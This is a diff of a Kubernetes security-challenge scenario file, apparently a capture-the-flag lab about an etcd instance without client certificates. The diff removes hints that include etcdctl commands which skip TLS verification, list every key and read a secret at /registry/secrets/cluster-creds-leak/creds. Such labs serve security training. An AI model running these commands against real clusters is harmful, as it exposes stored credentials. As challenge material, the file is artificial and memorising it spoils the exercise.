@@ -6,20 +6,6 @@ objective: Discover uncertified etcd, reach it with only network access and mast
 tasks:
   "1":
     hints:
-    - penalty: 10
-      text: Since we know the leak is not from the API Server or Kubelet, could the
-        secrets be leaking directly from etcd?
-    - penalty: 10
-      text: Try to install etcdctl and explore.
-    - penalty: 10
-      text: List etcd endpoints with ```ETCDCTL_API=3 etcdctl --endpoints=https://<K8s
-        master IP>:2379 --insecure-transport=false --insecure-skip-tls-verify get
-        / --prefix --keys-only```
-    - penalty: 10
-      text: Let's see if there's any 'secrets' here.
-    - penalty: 10
-      text: '```ETCDCTL_API=3 etcdctl --endpoints=https://<K8s master IP>:2379 --insecure-transport=false
-        --insecure-skip-tls-verify get /registry/secrets/cluster-creds-leak/creds```'
     sortOrder: 1
     startingPoint:
       mode: pod
